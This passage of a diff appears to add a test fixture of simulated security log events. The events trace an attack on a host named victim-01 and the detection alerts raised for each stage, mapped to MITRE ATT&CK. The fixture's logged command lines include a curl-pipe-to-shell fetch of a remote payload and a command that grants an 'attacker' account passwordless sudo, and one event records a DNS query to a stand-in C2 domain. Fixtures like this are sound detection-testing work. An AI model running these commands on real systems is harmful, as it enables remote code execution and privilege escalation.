+      "id": "u-0000000000000faa"
+    },
+    "source": {
+      "ip": "203.0.113.10"
+    },
+    "session": {
+      "id": "sess-00000000000003f2"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:50:10.000Z",
+    "event": {
+      "id": "evt-000000000000005c",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:50:10.000Z",
+      "ingested": "2026-01-13T12:50:11.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-000000000000000a",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/bash",
+    "process": {
+      "pid": 4210,
+      "executable": "/usr/bin/bash",
+      "entity_id": "p-00000000000007da",
+      "start": "2026-01-13T12:50:10.000Z",
+      "command_line": "/usr/bin/bash -c 'curl -s http://example.com/payload.sh | sh'",
+      "name": "bash"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:50:15.000Z",
+    "event": {
+      "id": "evt-000000000000005d",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:50:15.000Z",
+      "ingested": "2026-01-13T12:50:16.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-000000000000000a",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "wrote /tmp/payload_10.sh",
+    "file": {
+      "path": "/tmp/payload_10.sh"
+    },
+    "process": {
+      "entity_id": "p-00000000000007da"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:50:20.000Z",
+    "event": {
+      "id": "evt-000000000000005e",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:50:20.000Z",
+      "ingested": "2026-01-13T12:50:21.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-000000000000000a",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/sudo",
+    "process": {
+      "pid": 5210,
+      "executable": "/usr/bin/sudo",
+      "entity_id": "p-0000000000000bc2",
+      "start": "2026-01-13T12:50:20.000Z",
+      "command_line": "/usr/bin/sudo -n /usr/bin/bash -c 'echo attacker ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers'",
+      "name": "sudo",
+      "parent": {
+        "entity_id": "p-00000000000007da",
+        "pid": 4210,
+        "executable": "/usr/bin/bash",
+        "name": "bash"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:50:22.000Z",
+    "event": {
+      "id": "evt-000000000000005f",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:50:22.000Z",
+      "ingested": "2026-01-13T12:50:23.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-000000000000000a",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "modified /etc/sudoers",
+    "file": {
+      "path": "/etc/sudoers"
+    },
+    "process": {
+      "entity_id": "p-0000000000000bc2"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:50:30.000Z",
+    "event": {
+      "id": "evt-0000000000000060",
+      "kind": "event",
+      "dataset": "netflow.dns",
+      "created": "2026-01-13T12:50:30.000Z",
+      "ingested": "2026-01-13T12:50:31.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "protocol"
+      ],
+      "action": "dns_query"
+    },
+    "host": {
+      "id": "h-000000000000000a",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "DNS query c2-10.example.com",
+    "source": {
+      "ip": "10.0.0.10"
+    },
+    "destination": {
+      "ip": "8.8.8.8"
+    },
+    "network": {
+      "transport": "udp",
+      "protocol": "dns"
+    },
+    "dns": {
+      "question": {
+        "name": "c2-10.example.com"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:50:40.000Z",
+    "event": {
+      "id": "evt-0000000000000061",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:50:40.000Z",
+      "ingested": "2026-01-13T12:50:41.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 70
+    },
+    "host": {
+      "id": "h-000000000000000a",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Initial Access detected via remote login",
+    "rule": {
+      "id": "rule-ia-10",
+      "name": "Suspicious Remote Login"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0001",
+        "name": "Initial Access"
+      },
+      "technique": {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "suricata"
+        ],
+        "fingerprint": "fp-ia-0000000000001392"
+      },
+      "confidence": 0.82,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000005b"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:50:50.000Z",
+    "event": {
+      "id": "evt-0000000000000062",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:50:50.000Z",
+      "ingested": "2026-01-13T12:50:51.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 75
+    },
+    "host": {
+      "id": "h-000000000000000a",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Execution detected via suspicious shell command",
+    "rule": {
+      "id": "rule-ex-10",
+      "name": "Suspicious Script Execution"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0002",
+        "name": "Execution"
+      },
+      "technique": {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "filebeat_sigma"
+        ],
+        "fingerprint": "fp-ex-000000000000177a"
+      },
+      "confidence": 0.77,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000005c",
+          "evt-000000000000005d"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:51:00.000Z",
+    "event": {
+      "id": "evt-0000000000000063",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:51:00.000Z",
+      "ingested": "2026-01-13T12:51:01.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 85
+    },
+    "host": {
+      "id": "h-000000000000000a",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Privilege escalation detected via sudoers modification",
+    "rule": {
+      "id": "rule-pe-10",
+      "name": "Sudoers Modification"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0004",
+        "name": "Privilege Escalation"
+      },
+      "technique": {
+        "id": "T1548",
+        "name": "Abuse Elevation Control Mechanism"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco"
+        ],
+        "fingerprint": "fp-pe-0000000000001b62"
+      },
+      "confidence": 0.9,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000005e",
+          "evt-000000000000005f"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:51:10.000Z",
+    "event": {
+      "id": "evt-0000000000000064",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:51:10.000Z",
+      "ingested": "2026-01-13T12:51:11.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 65
+    },
+    "host": {
+      "id": "h-000000000000000a",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Command and Control detected via DNS beacon",
+    "rule": {
+      "id": "rule-c2-10",
+      "name": "Suspicious DNS Beacon"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0011",
+        "name": "Command and Control"
+      },
+      "technique": {
+        "id": "T1071",
+        "name": "Application Layer Protocol"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "suricata"
+        ],
+        "fingerprint": "fp-c2-0000000000001f4a"
+      },
+      "confidence": 0.72,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000060"
+        ]
+      }
+    }
+  }
+]
